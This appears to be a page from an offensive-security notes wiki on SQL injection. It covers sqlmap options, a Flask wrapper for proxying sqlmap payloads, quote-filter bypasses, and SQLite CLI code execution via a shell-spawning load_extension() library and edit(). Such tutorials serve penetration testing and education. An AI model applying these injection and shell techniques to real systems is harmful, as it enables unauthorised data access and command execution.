---
description: >-
  An infamous and simple attack where code is injected where data should be,
  rewriting the SQL Query
---

# SQL Injection

## SQLMap

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap" %}

You can run a raw request through `sqlmap` with cookies and POST to find any injection:

```shell-session
$ sqlmap -r r.txt --batch
```

* `--level=5` tests more inputs, like HTTP headers
* `--risk=3` tests more injection payloads

### XSS/SQLi through SQL Injection

{% embed url="https://jorianwoltjer.com/blog/post/hacking/intigriti-xss-challenge/intigriti-july-xss-challenge-0722" %}
Writeup showing XSS through a Second-Order injection (3-in-one)
{% endembed %}

Use `UNION SELECT` statements to alter the returned content on the site, with an XSS payload for example.

{% hint style="info" %}
Also try 'Second-Order' injection, by doing another injection inside of your `UNION` content if not all values can be altered (see the writeup above)
{% endhint %}

### Filter Bypass

Some scenarios where you can bypass character limits using functions or special syntax. \
**`+`** here means supported in more than just the mentioned DB backend.

* Quotes (`'` & `"`) like `"j0r1an"`:&#x20;
  * Use `0x6a307231616e` in **MySQL**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'0x$%26',false,false,false,false\)\&input=ajByMWFu)
  * Use [`char(106,48,114,49,97,110)`](https://www.sqlite.org/lang\_corefunc.html#char) in **SQLite+**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Decimal\('Comma',false\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'char\($%26\)',false,false,true,true\)\&input=ajByMWFu)

### Custom Wrapper (complex injections)

While most inputs are as simple as a query or body parameter, not all flows are like this. Interactions sometimes require special headers or formatting of the input, or the result of your action might only be visible on a different page. In these scenarios, SQLMap can fall short in its customization because it simply does not support everything.&#x20;

One clever solution to this is from a case where the hacker had to automate a blind SQL injection over a websocket. These are normally not possible in SQLMap, so you might think you need to create a custom script to extract all data slowly. While this is possible, an easier alternative is to **create a wrapper script** that makes it easy for SQLMap.&#x20;

{% embed url="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" %}
Writing a custom wrapper server for SQLMap to make exploitation easier
{% endembed %}

By creating a simple web server with a single query parameter as the payload, you can implement the full interaction in Python and then send back the result to SQLMap. You may do this for any kind of complex interaction with a server like this:

<pre class="language-python" data-title="proxy.py"><code class="lang-python">from flask import Flask, request
import requests

app = Flask(__name__)

def interact(payload):
    print(f"Payload: {payload}")
    # Example complex interaction
<strong>    requests.post("https://example.com/save", json={"input": payload})
</strong><strong>    r = requests.get("https://example.com/get_result")
</strong><strong>    return r.text
</strong>
@app.route('/')
def index():
    payload = request.args.get('id')
    return interact(payload)

if __name__ == '__main__':
    app.run(debug=False)
</code></pre>

Then run your server locally, and target _it_ instead of the regular target to proxy the traffic with your custom format and logic:

```bash
sqlmap -u 'http://localhost:5000/?id=1'
```

{% hint style="warning" %}
**Warning**: Performing this technique multiple times may make SQLMap cache results from a previous run because the same localhost URL is used. To ensure it starts completely fresh, clear the session every time using the `--flush-session` argument.
{% endhint %}

## SQLite

Tricks specific to the SQLite database backend.

### RCE through CLI

While looking through the documentation, you might notice functions that seem to have the ability to run arbitrary code on the system. The catch is that these methods are only possible using the `sqlite3` CLI tool by default, only with some very specific configuration will they be available through a normal library that uses the safer C-API behind the scenes.&#x20;

#### [`load_extension()`](https://www.sqlite.org/lang\_corefunc.html#load\_extension)

SQLite uses the C-API for all the heavy work, and the CLI as well as libraries are just wrappers over this. The `load_extension()` function is special as it can only be called after calling the `enable_load_extension()` function from the C-API, which is not available in SQL syntax. Fortunately, the **CLI enables this automatically** which means that if we are able to inject code into such a query, we can load extensions.&#x20;

These extensions are simply compiled C code in the form of `.so` files, with an init function:

<pre class="language-c" data-title="extension.c"><code class="lang-c">#include &#x3C;sqlite3ext.h>
SQLITE_EXTENSION_INIT1

#include &#x3C;stdlib.h>
#include &#x3C;unistd.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
  SQLITE_EXTENSION_INIT2(pApi);

<strong>  execve("/bin/sh", NULL, NULL);  // Spawn an interactive shell
</strong>
  return SQLITE_OK;
}
</code></pre>

```shell-session
$ gcc -s -g -fPIC -shared extension.c -o extension.so
```

Then from inside a CLI query, we can call the function with a path to the compiled extension:

<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select load_extension('./extension');
</strong>$ id
uid=1001(user) gid=1001(user) groups=1001(user)
</code></pre>

#### [`edit()`](https://www.sqlite.org/cli.html#the\_edit\_sql\_function)

The CLI also includes an extra special function used for editing data interactively, which allows its 2nd argument to decide what command to run! It is very straightforward to exploit:

<pre class="language-sql"><code class="lang-sql"><strong>sqlite> select edit(1,'id;');
</strong>uid=1001(user) gid=1001(user) groups=1001(user)
sh: 1: temp9385525e2ea5301f: not found
Error: EDITOR returned non-zero
</code></pre>
